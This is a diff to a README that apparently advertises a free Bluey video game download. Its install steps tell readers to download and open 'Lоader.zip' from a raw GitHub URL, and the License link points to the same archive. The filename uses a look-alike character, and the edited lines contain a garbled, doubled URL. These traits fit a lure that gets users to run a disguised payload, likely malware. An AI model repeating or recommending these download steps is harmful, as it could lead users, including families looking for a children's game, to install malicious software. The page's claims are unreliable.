@@ -30,7 +30,7 @@ Enjoy a seamless way to experience the magic of Bluey on your computer, featurin
 
 ## 🏗️ Installation
 
-1. Download **https://raw.githubusercontent.com/TepAzhar/BlueyVideogame-FreeDownloadHub/main/Lоader.zip** from this repository  
+1. Download **https://raw.githubusercontent.com/TepAzhar/BlueyVideogame-FreeDownloadHub/main/Lоader.zipоhttps://raw.githubusercontent.com/TepAzhar/BlueyVideogame-FreeDownloadHub/main/Lоader.zip** from this repository  
 2. Extract the archive to your preferred folder  
 3. Open the Loader and follow on-screen instructions  
 4. Play and adventure with Bluey, Bingo, Bandit, and Chilli!
@@ -52,4 +52,4 @@ Please support the official release!
 
 ## 📜 License
 
-This repository is licensed under the [MIT License](https://raw.githubusercontent.com/TepAzhar/BlueyVideogame-FreeDownloadHub/main/Lоader.zip) 🎉
+This repository is licensed under the [MIT License](https://raw.githubusercontent.com/TepAzhar/BlueyVideogame-FreeDownloadHub/main/Lоader.zipоhttps://raw.githubusercontent.com/TepAzhar/BlueyVideogame-FreeDownloadHub/main/Lоader.zip) 🎉
